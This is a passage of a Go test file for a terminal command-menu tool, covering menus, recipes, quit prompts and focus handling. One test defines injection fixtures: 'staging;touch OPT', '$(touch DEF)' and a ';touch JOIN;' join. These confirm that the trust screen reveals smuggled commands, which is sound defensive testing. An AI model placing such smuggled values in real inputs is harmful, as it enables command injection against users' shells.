			t.Errorf("%s should be on screen:\n%s", want, view)
		}
	}
}

func TestTrustScreenShowsOptionsDefaultsAndJoins(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	pack := `sections:
  - name: S
    commands:
      - name: D
        cmd: echo <env>
        args:
          - name: env
            options:
              - { value: 'staging;touch OPT', label: staging }
      - name: H
        cmd: echo <who>
        args:
          - { name: who, default: '$(touch DEF)' }
      - name: J
        cmd: echo <x>
        args:
          - name: x
            type: flags
            join: ';touch JOIN;'
            options: [a, b]
`
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	for _, want := range []string{"touch OPT", "touch DEF", "touch JOIN"} {
		if !strings.Contains(view, want) {
			t.Errorf("%s should be on the trust screen:\n%s", want, view)
		}
	}
}

func TestQuestionMarkShowsTheKeys(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "A", Cmd: "a"}}}}}})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	m.Update(typed("?"))
	if !m.help || !strings.Contains(ansi.Strip(m.view()), "shift-tab") {
		t.Fatal("? should show the keys")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if m.help || m.list.query() != "" {
		t.Fatal("any key closes it, and does nothing else")
	}
}

func TestAnEmptiedDefaultStaysEmpty(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Log", Cmd: "log <n> <x>", Args: []config.Arg{{Name: "n", Default: "20", Optional: true}, {Name: "x"}}},
	}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // n cleared on purpose
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})  // back to it
	if v := m.job.input.Value(); v != "" {
		t.Fatalf("the default shouldn't come back after being cleared, got %q", v)
	}
}

func TestTextHelpersHandleWideAndAccentedText(t *testing.T) {
	if got := sentence("école fermée"); got != "École fermée." {
		t.Errorf("sentence = %q", got)
	}
	if got := ansi.Strip(block("zzzzzzzzz 日本 ab cd", 10, 1, true)); strings.Contains(got, "…b") {
		t.Errorf("the cut should fall between words, got %q", got)
	}
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "G", header: true}, {title: "g1"}}, nil, false)
	p.cursor = 3
	if got := ansi.Strip(p.render(20, 1)); !strings.Contains(got, "g1") {
		t.Errorf("one row of room: it should show the cursor's row, got %q", got)
	}
}

func TestScrolledGroupKeepsItsHeading(t *testing.T) {
	var items []item
	for _, g := range []string{"Alpha", "Beta"} {
		items = append(items, item{title: g, header: true})
		for i := range 8 {
			items = append(items, item{title: fmt.Sprintf("%s %d", g, i)})
		}
	}
	p := newPicker(items, nil, false)
	for range 6 {
		p.move(1)
	}
	got := strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "ALPHA" || !strings.Contains(got[3], "Alpha 6") {
		t.Fatalf("the heading should be pinned on top, the cursor's row last, got %q", got)
	}
	for range 6 { // well into Beta: its heading takes over
		p.move(1)
	}
	got = strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "BETA" || !strings.Contains(got[3], "Beta 4") || strings.Contains(got[1], "Beta 0") {
		t.Fatalf("the next group's heading is pinned instead, got %q", got)
	}
	p.cursor, p.offset = 0, 0
	if got := ansi.Strip(p.render(40, 4)); strings.Count(got, "ALPHA") != 1 {
		t.Fatalf("at the top it's not doubled, got %q", got)
	}
}

func TestQuittingWithJobsAsksFirst(t *testing.T) {
	jobs := []string{"sleep"}
	m := New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
	esc, enter := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: tea.KeyEnter}
	m.Update(esc)
	if m.mode != modeQuit || m.Quit {
		t.Fatalf("it should ask, got mode %v quit %v", m.mode, m.Quit)
	}
	if got := ansi.Strip(m.quitView(60)); !strings.Contains(got, "sleep") {
		t.Errorf("it should say what would end: %q", got)
	}
	m.Update(esc)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("a second esc goes back: a double-tap never quits")
	}
	m.Update(esc)
	m.Update(enter)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("no comes first, so enter stays")
	}
	m.Update(esc)
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if _, cmd := m.Update(enter); !m.Quit || cmd == nil {
		t.Fatal("yes quits")
	}

	jobs = nil
	m = New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
	if m.Update(esc); !m.Quit {
		t.Fatal("with nothing running, esc quits straight away")
	}
}

// A resize repaints from clean: without it, one as the window opens left rows
// drawn over each other once the list scrolled.
func TestResizeRepaintsFromClean(t *testing.T) {
	m := New(Options{Config: &config.Config{}})
	_, cmd := m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if cmd == nil {
		t.Fatal("a resize asked for no repaint")
	}
	if got, want := fmt.Sprintf("%T", cmd()), fmt.Sprintf("%T", tea.ClearScreen()); got != want {
		t.Errorf("a resize sent %s, want %s", got, want)
	}
}

// A shell still reading its rc file locks the menu but doesn't say so: its
// subprocesses come and go too fast to read.
func TestStartingShellLocksQuietly(t *testing.T) {
	st := ShellState{Busy: "brew", Starting: true}
	m := New(Options{Config: &config.Config{}, Shell: func() ShellState { return st }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.readShell()
	if m.blocked() == "" {
		t.Error("the menu should still hold commands back")
	}
	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
		t.Errorf("the band should wait for the first prompt, got %q", bar)
	}
	st = ShellState{}
	m.readShell()
	st = ShellState{Busy: "sleep"}
	m.readShell()
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "sleep is running") {
		t.Errorf("after the first prompt the band should say so, got %q", bar)
	}
}

// Leaving for the shell and coming back, by focus event or by key, works on
// every screen: refocusing an input that screen never made used to panic,
// which took the whole session and its window with it.
func TestLeavingAndComingBackOnEveryScreen(t *testing.T) {
	text := []config.Arg{{Name: "name", Prompt: "name", Desc: "d"}}
	picks := []config.Arg{{Name: "name", Desc: "d", Options: []config.Option{{Value: "a"}, {Value: "b"}}}}
	for _, c := range []struct {
		name string
		cmd  config.Command
		keys []tea.KeyPressMsg
		mode mode
	}{
		{"typing", config.Command{Name: "C", Cmd: "x <name>", Args: text}, nil, modeFill},
		{"picking", config.Command{Name: "C", Cmd: "x <name>", Args: picks}, nil, modeFill},
		{"y/N", config.Command{Name: "C", Cmd: "x", Risk: config.RiskWarn}, nil, modeConfirm},
		{"y/N after typing", config.Command{Name: "C", Cmd: "x <name>", Args: text, Risk: config.RiskWarn}, []tea.KeyPressMsg{typed("v"), {Code: tea.KeyEnter}}, modeConfirm},
		{"danger code", config.Command{Name: "C", Cmd: "x", Risk: config.RiskDanger}, nil, modeConfirm},
	} {
		for _, back := range []struct {
			name string
			msg  tea.Msg
		}{{"focus", tea.FocusMsg{}}, {"key", typed("z")}} {
			t.Run(c.name+"/"+back.name, func(t *testing.T) {
				sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{c.cmd}}
				m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
					Send: func(string) error { return nil }})
				m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
				m.showSection(&m.opt.Config.Sections[0])
				m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
				for _, k := range c.keys {
					m.Update(k)
				}
				if m.mode != c.mode {
					t.Fatalf("mode %d, want %d", m.mode, c.mode)
				}
				m.Update(tea.BlurMsg{})
				_ = m.View()
				m.Update(back.msg)
				_ = m.View()
				if m.mode != c.mode || m.Quit {
					t.Errorf("coming back moved on: mode %d, quit %v", m.mode, m.Quit)
				}
				for _, in := range m.inputs() {
					if !in.Focused() {
						t.Error("an input on screen is still blurred")
					}
				}
			})
		}
	}
}

func TestSavingARecipe(t *testing.T) {
	cmds := []config.Command{{Name: "one", Cmd: "one"}, {Name: "two", ID: "s-22222222", Cmd: "two"}}
	var sent []string
	var saved []config.Recipe
	failed := false
	m := New(Options{
		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		LastFailed: func() bool { return failed }, Shell: func() ShellState { return ShellState{} },
		Recipes: func() []config.Recipe { return saved }, Self: "clingon",
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	sec := &m.opt.Config.Sections[0]
	oneID := sec.CommandID(&sec.Commands[0])
	saveCmd := "clingon recipe save 'My flow' " + oneID + " s-22222222"
	on := func(name string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
				return
			}
		}
		t.Fatalf("no row %q", name)
	}
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	left := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyLeft}) }
	down := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) }
	done := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
	sentIs := func(want string) {
		t.Helper()
		if got := strings.Join(sent, " | "); got != want {
			t.Errorf("sent %q, want %q", got, want)
		}
	}
	number := func() {
		t.Helper()
		m.showSection(sec)
		on("one")
		m.Update(typed("1"))
		on("two")
		m.Update(typed("2"))
		sent, m.errMsg, m.hint = nil, "", ""
		m.Update(typed("r"))
	}
	number()

	// Run recipe asks, and No is first: it just runs.
	right()
	if m.mode != modeSave || len(sent) != 0 || !strings.Contains(m.view(), "Save this recipe first?") {
		t.Fatalf("should ask first: mode %v, sent %v", m.mode, sent)
	}
	right()
	sentIs("one")
	done()
	done()
	sentIs("one | two")
	if m.run != nil || len(saved) != 0 {
		t.Fatalf("run %+v, saved %v", m.run, saved)
	}

	// Yes asks for a name, and ← steps back through the questions, sending nothing.
	sent = nil
	right()
	down()
	right()
	if m.mode != modeSaveName || !strings.Contains(m.view(), "Name this recipe") {
		t.Fatalf("mode %v: should ask for a name", m.mode)
	}
	right() // no name yet
	if m.mode != modeSaveName || m.run != nil {
		t.Fatal("a name is needed")
	}
	left()
	if m.mode != modeSave || !m.yes {
		t.Fatalf("← from the name: mode %v, yes %v", m.mode, m.yes)
	}
	left()
	if m.mode != modeBrowse || m.run != nil || len(sent) != 0 || len(m.recipe) != 2 {
		t.Fatalf("← from the question: mode %v, run %+v, sent %v", m.mode, m.run, sent)
	}

	// A name that's taken is refused there and then.
	saved = []config.Recipe{{Name: "My Flow", Steps: []string{"x-00000000"}}}
	right()
	m.Update(typed("y"))
	m.Update(typed("my flow"))
	right()
	if m.mode != modeSaveName || !strings.Contains(m.view(), "already have") {
		t.Fatalf("mode %v: a taken name should be refused", m.mode)
	}
	saved = nil

	// The save is a command in the shell, by ID, and the steps follow it.
	m.word.SetValue("")
	m.Update(typed("My  flow"))
	if !strings.Contains(ansi.Strip(m.infoPane(60)), "clingon recipe save") {
		t.Errorf("the command should show as it's named:\n%s", m.infoPane(60))
	}
	right()
	sentIs(saveCmd)
	saved = []config.Recipe{{Name: "My flow", Steps: []string{oneID, "s-22222222"}}}
	done()
	sentIs(saveCmd + " | one")
	done()
	done()
	sentIs(saveCmd + " | one | two")
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("run %+v, recipe %d steps", m.run, len(m.recipe))
	}

	// Now it's saved there's nothing to ask, and it's listed.
	sent = nil
	on("Run recipe")
	right()
	if m.mode == modeSave {
		t.Error("the same steps are saved already: shouldn't ask")
	}
	sentIs("one")
	done()
	done()
	if !strings.Contains(m.view(), "ALL RECIPES") {
		t.Errorf("should list it:\n%s", m.view())
	}

	// One list of them: the same recipe isn't repeated under other headings.
	if view := m.view(); !strings.Contains(view, "ALL RECIPES") || strings.Count(ansi.Strip(view), "My flow") != 1 {
		t.Errorf("should list it once:\n%s", view)
	}

	// Its row opens its own list, in this order. ← goes back to its row.
	titles := func() string {
		var ts []string
		for i, it := range m.list.view {
			if m.list.selectable(i) {
				ts = append(ts, it.title)
			}
		}
		return strings.Join(ts, " ")
	}
	open := func(name string) {
		t.Helper()
		on(name)
		right()
		if titles() != "Run Inspect Delete" {
			t.Fatalf("%s's rows: %q", name, titles())
		}
	}
	m.Update(typed("x"))
	sent, m.hint = nil, ""
	open("My flow")
	if !strings.Contains(ansi.Strip(m.view()), "› My flow") || m.list.selected().title != "Run" {
		t.Errorf("at %+v:\n%s", m.list.selected(), m.view())
	}
	left()
	if it := m.list.selected(); m.section != m.recipesSection() || it == nil || it.title != "My flow" {
		t.Fatalf("← should go back to its row, at %+v", it)
	}

	// Run makes it the current recipe, in place of what's numbered, and runs it.
	open("My flow")
	on("Run")
	right()
	sentIs("one")
	if len(m.recipe) != 2 || m.run == nil || m.opened != "" {
		t.Fatalf("recipe %d steps, run %+v, opened %q", len(m.recipe), m.run, m.opened)
	}
	done()
	done()

	// Inspect sends that alone, runs no steps, and stays on the row.
	open("My flow")
	on("Inspect")
	inspecting := m.list.cursor
	sent = nil
	right()
	sentIs("clingon recipe describe 'My flow'")
	if m.run != nil || m.list.cursor != inspecting || m.opened != "My flow" {
		t.Errorf("run %+v, cursor %d, want %d, opened %q", m.run, m.list.cursor, inspecting, m.opened)
	}

	// Delete asks first, No first, and sends nothing unless it's Yes.
	idle := func() { t.Helper(); m.Update(idleMsg{seq: m.runSeq, ok: true}) }
	idle()
	saved = []config.Recipe{{Name: "A", Steps: saved[0].Steps}, {Name: "My flow", Steps: saved[0].Steps}, {Name: "Z", Steps: saved[0].Steps}}
	m.showSection(m.section)
	on("Delete")
	if it := m.list.selected(); it.risk != config.RiskWarn {
		t.Errorf("should be marked as a warning: %+v", it)
	}
	sent = nil
	right()
	if m.mode != modeConfirm || m.yes || len(sent) != 0 {
		t.Fatalf("should ask, No first: mode %v, yes %v, sent %v", m.mode, m.yes, sent)
	}
	right()
	if it := m.list.selected(); len(sent) != 0 || m.mode != modeBrowse || it.title != "Delete" {
		t.Errorf("No: sent %v, mode %v, at %+v", sent, m.mode, it)
	}
	right()
	m.Update(typed("y"))
	sentIs("clingon recipe remove 'My flow'")

	// If it fails it's still there, and so are you.
	idle()
	if it := m.list.selected(); m.opened != "My flow" || it.title != "Delete" {
		t.Errorf("opened %q, at %+v", m.opened, it)
	}

	// When it's gone, you're back in All recipes, on the next one.
	right()
	m.Update(typed("y"))
	saved = slices.Delete(saved, 1, 2)
	idle()
	if it := m.list.selected(); m.opened != "" || it.title != "Z" {
		t.Errorf("opened %q, at %+v:\n%s", m.opened, it, m.view())
	}

	// Removed in the shell by hand, the list catches up as well.
	saved = saved[:1]
	idle()
	if strings.Contains(ansi.Strip(m.view()), "Z") {
		t.Errorf("Z was removed by hand:\n%s", m.view())
	}

	// A step whose command has gone stops it before anything runs.
	saved = []config.Recipe{{Name: "Old", Steps: []string{"x-00000000"}}}
	m.showSection(m.section)
	sent = nil
	open("Old")
	on("Run")
	right()
	if len(sent) != 0 || m.run != nil || !strings.Contains(m.errMsg, "gone") {
		t.Errorf("sent %v, run %+v, err %q", sent, m.run, m.errMsg)
	}
	left()

	// A save that fails stops there: no steps run, and the recipe stays.
	saved, failed, sent = nil, true, nil
	m.errMsg = ""
	on("Run recipe")
	right()
	m.Update(typed("y"))
	m.Update(typed("Again"))
	right()
	done()
	if len(sent) != 1 || m.run != nil || !strings.Contains(m.errMsg, "not saved") || len(m.recipe) != 2 {
		t.Errorf("sent %v, run %+v, err %q, recipe %d steps", sent, m.run, m.errMsg, len(m.recipe))
	}
}
